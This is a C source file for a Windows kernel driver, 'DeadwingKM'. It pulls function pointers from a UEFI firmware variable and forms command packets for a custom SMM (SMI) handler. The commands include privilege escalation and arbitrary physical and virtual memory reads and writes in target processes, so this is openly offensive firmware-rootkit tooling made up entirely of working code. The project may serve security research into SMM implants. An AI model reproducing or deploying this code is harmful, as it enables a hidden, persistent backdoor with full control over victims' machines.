#include <ntddk.h>

#include "Defs.h"
#include "Triggers.h"


/**
 * \brief Caches transfered info from boot environment. Should be
 * called once.
 *
 * \return STATUS_SUCCESS - Information has been cached
 * \return Other - Probably, variable doesn't exists
 */
NTSTATUS
NTAPI
TransferWorker(
	VOID
) {
	DEADWING_TRANSFER TransferInfo = { 0 };

	// get information from variable
	ULONG Length = sizeof(DEADWING_TRANSFER);
	ULONG Attributes = 0;
	UNICODE_STRING VariableName = RTL_CONSTANT_STRING(L"DeadwingTransfer");
	NTSTATUS Status = ExGetFirmwareEnvironmentVariable(&VariableName, &gDeadwingTransferVarGuid, &TransferInfo, &Length, &Attributes);
	if(!NT_SUCCESS(Status)) {
		KdPrint(("[ DeadwingKM ] Unable to resolve transfer info (0x%llX)\n", Status));
		return Status;
	}

	// print transfered information
	KdPrint(("\n[ DeadwingKM ] Transfer info:\n"));
	KdPrint(("[ DeadwingKM ] Virtual address of communication buffer: 0x%llX\n", TransferInfo.Buffer.CommBufVirtual));
	KdPrint(("[ DeadwingKM ] Physical address of communication buffer: 0x%llX\n", TransferInfo.Buffer.CommBufPhys));
	KdPrint(("[ DeadwingKM ] Size of communication buffer: 0x%llX\n", TransferInfo.Buffer.CommBufSize));
	KdPrint(("[ DeadwingKM ] Setup communication buffer function: 0x%llX\n", TransferInfo.API.SetupBufFunction));
	KdPrint(("[ DeadwingKM ] Communication trigger function: 0x%llX\n", TransferInfo.API.SmmCommunicateFunction));

	// cache size of buffer
	gBufSize = TransferInfo.Buffer.CommBufSize;

	// setup functions
	SetupCommunicationBuffer = (__T_SetupCommunicationBuffer)TransferInfo.API.SetupBufFunction;
	DeadwingSmmCommunicate = (__T_DeadwingSmmCommunicate)TransferInfo.API.SmmCommunicateFunction;
	if(SetupCommunicationBuffer == NULL || DeadwingSmmCommunicate == NULL) {
		KdPrint(("[ DeadwingKM ] Unable to setup communication functions\n"));
		return STATUS_NOT_FOUND;
	}

	return STATUS_SUCCESS;
}

/**
 * \brief Forms request/response packet which will be used by
 * SMI handler and KM driver for communication
 * 
 * \param Command   Command for SMI handler
 * \param ProcessId Target PID
 * \param Arg1      Optional argument 1
 * \param Arg2      Optional argument 2
 * \param Arg3      Optional argument 3
 * \param Packet    Output packet
 * 
 * \return STATUS_SUCCESS - Succesfully formed and copied packet
 * \return STATUS_INVALID_PARAMETER_1 - Invalid commnad for SMI handler
 */
NTSTATUS
NTAPI
FormPacket(
	_In_     UINT64                  Command,
	_In_opt_ UINT64                  ProcessId,
	_In_opt_ UINT64                  Arg1,
	_In_opt_ UINT64                  Arg2,
	_In_opt_ UINT64                  Arg3,
	_Out_    PDEADWING_COMMUNICATION Packet
) {

	DEADWING_COMMUNICATION Communication = { 0 };

	// set default status and size
	Communication.Command = Command;
	Communication.SmiRetStatus = EFI_ABORTED;
	Communication.CommBufSize = gBufSize;

	// check command type
	switch(Command) {
		case CMD_DEADWING_PING_SMI:
		case CMD_DEADWING_PRIV_ESC:
		break;
		case CMD_DEADWING_READ_PHYS:
			Communication.Read.PhysReadAddress = (PVOID)Arg1;
			Communication.Read.ReadResult = (PVOID)Arg2;
			Communication.Read.ReadLength = Arg3;
		break;
		case CMD_DEADWING_READ_VIRTUAL:
			Communication.Read.TargetProcessId = ProcessId;
			Communication.Read.VaReadAddress = (PVOID)Arg1;
			Communication.Read.ReadResult = (PVOID)Arg2;
			Communication.Read.ReadLength = Arg3;
		break;
		case CMD_DEADWING_WRITE_PHYS:
			Communication.Write.PhysWriteAddress = (PVOID)Arg1;
			Communication.Write.DataToWrite = (PVOID)Arg2;
			Communication.Write.WriteLength = Arg3;
		break;
		case CMD_DEADWING_WRITE_VIRTUAL:
			Communication.Write.TargetProcessId = ProcessId;
			Communication.Write.VaWriteAddress = (PVOID)Arg1;
			Communication.Write.DataToWrite = (PVOID)Arg2;
			Communication.Write.WriteLength = Arg3;
		break;
		case CMD_DEADWING_CACHE_SESSION_INFO:
			Communication.Cache.ControllerProcessId = ProcessId;
			Communication.Cache.VaPsInitialSysProcess = (PVOID)Arg1;
			Communication.Cache.DirBase = Arg2;
		break;
		case CMD_DEADWING_VIRT_TO_PHYS:
			Communication.Vtop.TargetPid = ProcessId;
			Communication.Vtop.AddressToTranslate = (PVOID)Arg1;
		break;
		default:
			KdPrint(("[ DeadwingKM ] Received unknown command\n"));
			return STATUS_INVALID_PARAMETER_1;
		break;
	}

	// save packet
	*Packet = Communication;

	return STATUS_SUCCESS;
}

/**
 * \brief Converts EFI_STATUS to NTSTATUS
 * 
 * \param EfiStatus Provided EFI_STATUS which returned SMI handler
 * 
 * \returns Converted NTSTATUS
 */
NTSTATUS
NTAPI
EfiStatusToNtStatus(
	_In_ UINT64 EfiStatus
) {
	/// \note @0x00Alchemist: check if returned status is EFI_SUCCESS.
	/// No reasons to check it with other statuses
	if(EfiStatus == EFI_SUCCESS)
		return STATUS_SUCCESS;

	/// \note @0x00Alchemist: we're interested only in values which
	/// can be returned only by our SMI handler
	NTSTATUS Converted;
	switch(EfiStatus) {
		case EFI_INVALID_PARAMETER:
			Converted = STATUS_INVALID_PARAMETER;
		break;
		case EFI_UNSUPPORTED:
			Converted = STATUS_NOT_SUPPORTED;
		break;
		case EFI_NOT_READY:
		case EFI_NOT_FOUND:
			Converted = STATUS_NOT_FOUND;
		break;
		case EFI_ABORTED:
			Converted = STATUS_REQUEST_ABORTED;
		break;
		default:
			Converted = STATUS_UNSUCCESSFUL;
		break;
	}

	return Converted;
}
